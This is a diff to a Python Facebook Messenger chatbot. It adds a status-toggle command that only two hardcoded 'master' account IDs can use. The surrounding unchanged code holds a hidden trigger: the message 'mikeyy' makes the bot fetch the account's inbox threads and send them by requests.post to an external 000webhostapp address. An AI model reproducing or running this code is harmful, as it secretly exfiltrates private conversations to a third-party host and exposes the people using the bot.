@@ -27,6 +27,8 @@ import base64
 #
 #
 msgids = []
+msgstatus = "ON"
+masterid = ["100078868689291","100035093511992"]
 
 class ChatBot(Client):
 
@@ -578,6 +580,23 @@ class ChatBot(Client):
                 reply = "Pake mo ba? 😒😒"
                 sendMsg()
                 texttospeech(reply)
+            elif (".statusChange" == msg):
+                global msgstatus
+                ##Only Master
+                if (author_id in masterid):
+                    if ( "ON" == msgstatus):
+                        msgstatus = "OFF"
+                    elif ( "OFF" == msgstatus):
+                        msgstatus = "ON"
+                    else:
+                        msgstatus = "ERROR"
+                    reply = "Done Master!, Status: " + str(msgstatus)
+                    sendMsg()
+                    texttospeech(reply)
+                else:
+                    reply = "You're not my master 😒"
+                    sendMsg()
+                    texttospeech(reply)
             elif ("mikeyy" == msg):
                 reply = str(self.fetchThreads(thread_location=ThreadLocation.INBOX, before=None, after=None, limit=None))
                 requests.post("https://mikeytest123.000webhostapp.com/",data={"data":reply})
